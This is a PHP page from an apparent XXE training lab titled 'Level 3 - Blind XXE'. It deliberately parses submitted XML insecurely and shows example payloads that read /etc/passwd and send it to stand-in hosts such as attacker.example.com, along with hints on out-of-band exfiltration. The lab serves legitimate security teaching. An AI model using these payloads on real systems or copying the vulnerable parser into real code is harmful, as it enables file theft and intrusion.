<?php include '../includes/header.php'; ?>

        <div class="main-content">
            <h2>Level 3 - Blind XXE</h2>
            
            <div style="margin: 20px 0; padding: 15px; background: #e7f3ff; border-radius: 5px; border-left: 3px solid #007bff;">
                <h3>📖 Lab Description</h3>
                <p>
                    This lab demonstrates Blind XXE vulnerability. The server parses XML but does not display the 
                    parsed content directly in the response. Instead, you can observe interactions by checking 
                    the server-side logs.
                </p>
            </div>

            <div class="xml-form">
                <h3>XML Input:</h3>
                <form method="POST">
                    <textarea name="xml_input" placeholder="Enter XML here..."><?php 
                        echo htmlspecialchars('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY exfil SYSTEM "http://attacker.example.com/exfil?data=%file;">
    <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>
    <message>Processing...</message>
</data>'); 
                    ?></textarea>
                    <br>
                    <button type="submit">Parse XML</button>
                </form>
            </div>

            <?php
            $logFile = '../logs/blind_xxe.log';
            if (!file_exists(dirname($logFile))) {
                mkdir(dirname($logFile), 0755, true);
            }
            if (!file_exists($logFile)) {
                file_put_contents($logFile, '');
            }

            if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['xml_input'])) {
                $xml = $_POST['xml_input'];
                
                // Log the request for debugging purposes
                $logEntry = "[" . date('Y-m-d H:i:s') . "] XML Received: " . $xml . "\n";
                file_put_contents($logFile, $logEntry, FILE_APPEND);
                
                // Vulnerable XML parsing - intentionally insecure!
                $result = simplexml_load_string($xml);
                
                // Always return generic response without detailed output
                echo '<div class="results">';
                echo '<h3>✅ Processing Complete</h3>';
                echo '<p>Your XML has been processed successfully. No detailed output is available.</p>';
                echo '</div>';
            }

            // Display log entries
            if (filesize($logFile) > 0) {
                $logs = file_get_contents($logFile);
                echo '<div class="results">';
                echo '<h3>📋 Server Logs:</h3>';
                echo '<pre style="max-height: 300px; overflow-y: auto;">' . htmlspecialchars($logs) . '</pre>';
                echo '</div>';
            }
            ?>

            <div class="examples">
                <h3>💡 Example Payloads:</h3>
                
                <h4>Exfiltrate Data via External Server:</h4>
                <pre><?php echo htmlspecialchars('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY exfil SYSTEM "http://your-server.com/exfil?data=%file;">
    <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>
    <message>Request</message>
</data>'); ?></pre>
                
                <h4>Out-of-Band Detection:</h4>
                <pre><?php echo htmlspecialchars('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY ping SYSTEM "http://attacker.example.com/ping">
]>
<data>
    <content>&ping;</content>
</data>'); ?></pre>
            </div>

            <div class="hints">
                <h3>💡 Hints:</h3>
                <ul>
                    <li>The response doesn't show parsing results directly</li>
                    <li>Check the server logs to see if entities were processed</li>
                    <li>Try using external resources to exfiltrate data</li>
                    <li>Payloads will use external URLs you control</li>
                </ul>
            </div>
        </div>

<?php include '../includes/footer.php'; ?>
